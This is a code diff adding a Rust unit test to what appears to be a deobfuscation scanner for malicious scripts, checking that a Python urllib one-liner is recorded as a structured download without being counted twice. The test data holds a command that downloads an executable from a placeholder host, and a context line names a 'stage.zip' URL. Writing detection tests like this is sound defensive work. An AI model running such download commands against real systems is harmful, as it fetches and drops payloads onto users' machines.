@@ -11620,6 +11620,39 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_urllib_urlretrieve_variable_url_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import urllib.request; u = 'https://py.example/var-file.exe'; urllib.request.urlretrieve(u, 'var-file.exe')""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/var-file.exe"
+                        && dst.as_deref() == Some("var-file.exe")
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python urlretrieve variable URL: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/var-file.exe")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python urlretrieve variable URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_urllib_multiline_urlretrieve_alias_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
